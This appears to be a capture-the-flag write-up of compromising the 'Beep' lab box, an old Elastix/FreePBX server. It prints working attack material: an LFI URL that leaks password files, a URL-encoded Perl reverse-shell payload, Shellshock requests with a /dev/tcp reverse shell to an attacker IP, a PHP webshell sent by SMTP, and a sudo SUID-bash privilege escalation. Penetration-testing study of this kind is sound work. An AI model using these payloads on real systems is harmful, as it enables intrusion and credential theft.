### Summary
We start this box with a couple of enumeration targets and see that this is a very old box running Internet Private Branch Exchange (PBX) software. We run a directory brute-force on the `elastix` web server on ports `80/443` and follow up with `searchsploit` to get LFI on a configuration file that stores potential system passwords. From here there's a few places to get a user shell as `asterisk`:
- We can use `sipvicious_svwar` to identify the PBX extensions in place to follow up with a RCE vulnerability in `elastix`
- We can use the LFI combined with `SMTP` to send and load php web shell on the system
From there we have a plethora of options to escalate privilege with passwordless sudo, including `nmap` (has a built in interactive shell), `chown` and many more.

There are a couple ways to immediately get a root shell as well:
- We could immediately get RCE as root by logging into the `Webmin` instance on `TCP` port `10000` using the credentials uncovered from the LFI configuration file
- We could log in as root using `ssh` if we downgrade acceptable cryptosuite
- We could use `Shellshock` since the `Webmin` instance utilizes a `.cgi` file

### Tools
- `feroxbuster`
- `ffuf` - for when `feroxbuster` fails
- `sipvicious_svwar` - identifies working extension lines on a PBX
- `swaks` - smtp wrapper, swiss army knife for stmp

###### [[#Recon]]
- [[#Initial Scan]]
- [[#Web - TCP 80/443]]
	- [[#LFI]]
	- [[#RCE]]
- [[#SMTP - TCP 25]]
- [[#HTTP - TCP 10000]]
###### [[#User Shell - asterisk]]
- [[#Shell Upgrade]]
- [[#Enumeration]]
###### [[#Root Shell]]
- [[#chown privesc]]
- [[#Webmin]]
- [[#ShellShock]]
- [[#File Upload]]
	- [[#SMTP]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.44.234 -oN nmap/tcp             
Scanned at 2025-12-23 21:35:12 EST for 7s
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 63
25/tcp    open  smtp             syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
110/tcp   open  pop3             syn-ack ttl 63
111/tcp   open  rpcbind          syn-ack ttl 63
143/tcp   open  imap             syn-ack ttl 63
443/tcp   open  https            syn-ack ttl 63
858/tcp   open  unknown          syn-ack ttl 63
993/tcp   open  imaps            syn-ack ttl 63
995/tcp   open  pop3s            syn-ack ttl 63
3306/tcp  open  mysql            syn-ack ttl 63
4190/tcp  open  sieve            syn-ack ttl 63
4445/tcp  open  upnotifyp        syn-ack ttl 63
4559/tcp  open  hylafax          syn-ack ttl 63
5038/tcp  open  unknown          syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds
           Raw packets sent: 66515 (2.927MB) | Rcvd: 65536 (2.621MB)
```
```sh
❯ sudo nmap -p 22,25,80,110,111,143,443,858,993,995,3306,4190,4445,4559,5038,10000 -sCV 10.129.44.234 -oN nmap/tcp-scripts           
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp?
|_smtp-commands: Couldn\'t establish connection on port 25
80/tcp    open  http       Apache httpd 2.2.3
|_http-title: Did not follow redirect to https://10.129.44.234/
|_http-server-header: Apache/2.2.3 (CentOS)
110/tcp   open  pop3?
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            855/udp   status
|_  100024  1            858/tcp   status
143/tcp   open  imap?
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2025-12-24T02:42:12+00:00; +8s from scanner time.
858/tcp   open  status     1 (RPC #100024)
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql?
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_mysql-info: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve?
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax?
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn\'t have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.570
Service Info: Host: 127.0.0.1

Host script results:
|_clock-skew: 7s
```
- The TTL corresponds to a posix system
- Given the `Apache/2.2.3 (CentOS)` on port 80, it looks like we're running `CentOS 5` (super old)

## Web - TCP 80/443
---
- When we open the web application, we're redirected to an [`elastix`](https://en.wikipedia.org/wiki/Elastix) login page
	- `elastix` is an open-source `unified communications server` which brings together `IP PBX`, email, IM, faxing, etc.
- We look up `searchsploit` and we find several `elastix` exploits but none that would bypass login

- We can slap this into `feroxbuster` and see what happens with a couple wild extension guesses:
```sh
❯ feroxbuster -u "http://beep" -x html,php -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/raft-medium-directories.txt --burp
```
- But since all subdirectories are `302`'d back, it ignores redirects
- Attempting to fix brought me down an `SSL` rabbit hole that wouldn't fix so I tried `ffuf` instead

```sh
❯ ffuf -u "https://beep/FUZZ" -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/raft-medium-directories.txt

modules     [Status: 301, Size: 299, Words: 20, Lines: 10, Duration: 36ms]
admin       [Status: 301, Size: 297, Words: 20, Lines: 10, Duration: 30ms]
images      [Status: 301, Size: 298, Words: 20, Lines: 10, Duration: 27ms]
themes      [Status: 301, Size: 298, Words: 20, Lines: 10, Duration: 21ms]
help        [Status: 301, Size: 296, Words: 20, Lines: 10, Duration: 64ms]
var         [Status: 301, Size: 295, Words: 20, Lines: 10, Duration: 42ms]
mail        [Status: 301, Size: 296, Words: 20, Lines: 10, Duration: 47ms]
static      [Status: 301, Size: 298, Words: 20, Lines: 10, Duration: 33ms]
lang        [Status: 301, Size: 296, Words: 20, Lines: 10, Duration: 43ms]
libs        [Status: 301, Size: 296, Words: 20, Lines: 10, Duration: 18ms]
panel       [Status: 301, Size: 297, Words: 20, Lines: 10, Duration: 31ms]
configs     [Status: 301, Size: 299, Words: 20, Lines: 10, Duration: 27ms]
            [Status: 200, Size: 1785, Words: 103, Lines: 35, Duration: 36ms]
recordings  [Status: 301, Size: 302, Words: 20, Lines: 10, Duration: 36ms]
vtigercrm   [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 36ms]
```

- Navigating to `/modules` gives us a walkable directory but accessing everything gives blank responses
- `/admin` requires a login, but when we cancel the login we're redirected to `report.php` and we see a `FreePBX` page version `2.8.14`
- `/panel` brings us to a `flash` page
- `/mail` brings us to a roundcube login page
- `/recordings` brings us to a a `FreePBX` user portal 
- `/vtigercrm` brings us to another login page that indicates `vtiger CRM 5.1.0`

- We can look at `searchsploit` for `elastix`:
```sh
❯ searchsploit -x 37637     
Elastix - 'page' Cross-Site Scripting | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py
```
- One exploit of interest would be the LFI

### LFI
- We can snatch the contents of `/etc/passwd` with the following:
```http
https://10.129.44.234/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```
```text
root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash distcache:x:94:94:Distcache:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin pcap:x:77:77::/var/arpwatch:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash dbus:x:81:81:System message bus:/:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin spamfilter:x:500:500::/home/spamfilter:/bin/bash haldaemon:x:68:68:HAL daemon:/:/sbin/nologin xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin fanis:x:501:501::/home/fanis:/bin/bash Sorry! Attempt to access restricted file.
```
- The `searchsploit` POC has us nab the `amportal.conf` which has a bunch of potential credentials:
```text
# AMPDBNAME=asterisk AMPDBUSER=asteriskuser 
# AMPDBPASS=amp109 AMPDBPASS=jEhdIekWmdjE AMPENGINE=asterisk AMPMGRUSER=admin 
#AMPMGRPASS=amp111 AMPMGRPASS=jEhdIekWmdjE 
#FOPPASSWORD=passw0rd FOPPASSWORD=jEhdIekWmdjE 
# Change this to whatever you want, don't forget to change the ARI_ADMIN_PASSWORD as well ARI_ADMIN_USERNAME=admin 
# This is the default admin password to allow an administrator to login to ARI bypassing all security. 
# Change this to a secure password. ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```
#### Usernames
```text
asteriskuser
admin
```
#### Passwords
```text
amp109
amp111
jEhdIekWmdjE
passw0rd
```

- We can navigate back to `/admin` and enter the credentials `admin:jEhdIekWmdjE` and we gain access!
- Searching around though, there's an asterisk CLI that supposedly allows us to run shell commands but they don't display anything
- If we navigate to the `recordings` tab, we're rerouted to `/recordings/index.php` where we can log on with the same credentials
- We see a call monitor where logs of previous calls are itemized. An interesting item of note is that the destination extension is `233`
![[Pasted image 20251224151316.png]]

### RCE
- We can inspect the `searchsploit` results of the RCE vulnerability and see that there's a a vulnerability in `https://10.129.44.234/recordings/misc/callme_page.php`
- We need 3 things for this vulnerability, the vulnerable host and port which we already have, and a valid extension which we uncovered from gaining access to `/recordings`
- If we didn't have this access, we could also use the `svwar` tool from the python `sipvicious` package:
```sh
❯ sipvicious_svwar -m INVITE -e100-999 10.129.44.234  
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+
```
- Only works when we set the `INVITE` option (as opposed to `REGISTER` and `OPTIONS`)

- Now we can plug in the `searchsploit` POC variables into the URL and see what happens:
```python
In [1]: rhost = '10.129.44.234'
In [2]: lhost = '10.10.14.50'
In [3]: lport = 12345
In [4]: extension='233'
In [5]: url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2ci
   ...: f%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%
   ...: 3b%27%0D%0A%0D%0A'
   ...: 
In [6]: print(url)
https://10.129.44.234/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.50%3a12345%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.44.234.
Ncat: Connection from 10.129.44.234:50588.
whoami
asterisk
```

## SMTP - TCP 25
---
- We can enumerate user accounts connected to mail via `SMTP`
- Since we've uncovered [[#LFI]] in the web application, we can cheat a bit for demonstration and grab the list of users:
```text
root
sync
shutdown
halt
news
mysql
cyrus
asterisk
spamfilter
fanis
```

- We can use `nc` to connect to the `SMTP` server:
```sh
❯ nc 10.129.44.234 25        
220 beep.localdomain ESMTP Postfix
EHLO wallfly <-- doesnt matter whats typed after EHLO
250-beep.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
VRFY root@localhost <-- positive
252 2.0.0 root@localhost
VRFY wallfly@localhost <-- supposed to fail
550 5.1.1 <wallfly@localhost>: Recipient address rejected: User unknown in local recipient table
VRFY mysql@localhost <-- 
252 2.0.0 mysql@localhost
```
- We can continue this route and find valid accounts, otherwise we could use a brute-force script

## HTTP - TCP 10000
---
- When we access the web application, we see a login page for [`Webmin`](https://webmin.com/)
![[Pasted image 20251224154409.png]]
- `Webmin` is a web-based system administration tool for unix-like servers, owning this effective owns the system
- We find that the credentials `root:jEhdIekWmdjE` get us into the system, allowing us a clear path to a root shell that will be covered shortly

# User Shell - asterisk
## Shell Upgrade
---
```sh
python -c 'import pty; pty.spawn("bash")'
bash-3.2$ ^Z
[1]  + 2894998 suspended  nc -lvnp 12345
❯ stty raw -echo; export TERM=xterm; fg
[1]  + 2894998 continued  nc -lvnp 12345
```

## Enumeration
---
- We find the `user.txt` file in the home directory of the user `fanis`:
```sh
bash-3.2$ cat /home/fanis/user.txt 
ee6ec0ec138470209aec5c5984424a5c
```

- We quickly check passwordless sudo:
```sh
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```

# Root Shell

## chown privesc
---
- There's a Lot of privesc options here, the easiest being `chmod` where we can add the suid bit to `/bin/bash`:
```sh
bash-3.2$ sudo chmod +s /bin/bash
bash-3.2$ ls -lah $(which bash)
-rwsr-sr-x 1 root root 718K Jan 22  2009 /bin/bash
bash-3.2$ bash -p
bash-3.2# whoami
root
bash-3.2# cat /root/root.txt 
a7f1efd3db29ccee2e6e1d76c253abfa
```

## Webmin
---
- When we log into the `webmin` portal, we have a lot of options. We could change users' passwords, we can schedule commands and cronjobs, we even have access to a command shell
- We can easily input a reverse bash shell as our command to get root on the box:
![[Pasted image 20251224224241.png]]
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.229.183.
Ncat: Connection from 10.129.229.183:33836.
bash: no job control in this shell
[root@beep ~]# whoami
root
```

## ShellShock
---
- When we get access to the `webmin` console on `TCP 10000` we notice that the logon request is to `/session_login.cgi`
- If we see a request to a `cgi` or `sh` on an old box then we should immediately think `Shellshock`
- We can throw together a probing request like the following:
```http
GET /session_login.cgi HTTP/1.1
Host: 10.129.44.234:10000
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="143", "Not=A?Brand";v="8", "Chromium";v="143"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: () { :; }; echo fuck;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
```
- Nothing showed up, so I changed the payload to `sleep 10` and the it took 10+ seconds to get a response, indicating a successful injection!
- If `User-Agent` didn't work, we could also try `Cookie` or `Referer`
- We can inject a bash reverse shell with the following:
```http
GET /session_login.cgi HTTP/1.1
Host: 10.129.44.234:10000
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="143", "Not=A?Brand";v="8", "Chromium";v="143"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: () { :; }; bash -i >& /dev/tcp/10.10.14.50/12345 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
```
```sh
❯ nc -lvnp 12345     
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.229.183.
Ncat: Connection from 10.129.229.183:47727.
bash: no job control in this shell
[root@beep webmin]# whoami
root
```

## File Upload
---
- Since we have LFI through a `.php` endpoint, if we can upload our own malicious `php` webshell, then we can get RCE if we didn't already have it
- There are potential avenues like web server log injection and cookie injection to `/tmp/cookie_name` which will be covered in other boxes, but our avenue involves sending a user mail through `SMTP`
### SMTP
- We can use `swaks`, an `SMTP` swiss army knife to send a `php` webshell via mail to a user account on the box. We have LFI through the user `asterisk`:
```sh
❯ swaks --to asterisk@localhost --from wallfly@htb --header "Subject: test shell" --body 'nothing to see here: <?php system($_REQUEST["cmd"]); ?>' --server 10.129.44.234 --helo wallfly
=== Trying 10.129.44.234:25...
=== Connected to 10.129.44.234.
<-  220 beep.localdomain ESMTP Postfix
 -> EHLO wallfly
<-  250-beep.localdomain
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250 DSN
 -> MAIL FROM:<wallfly@htb>
<-  250 2.1.0 Ok
 -> RCPT TO:<asterisk@localhost>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Wed, 24 Dec 2025 22:50:20 -0500
 -> To: asterisk@localhost
 -> From: wallfly@htb
 -> Subject: test shell
 -> Message-Id: <20251224225020.3069216@>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> 
 -> nothing to see here: <?php system($_REQUEST["cmd"]); ?>
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 914C8C0003
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

- Now if we navigate to `/var/mail/asterisk`, we should see our command injection by the bottom of the mail file!
```http
https://10.129.44.234/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action&cmd=id
```
```text
...
nothing to see here: uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
...
```
- And from there we can spawn a reverse shell

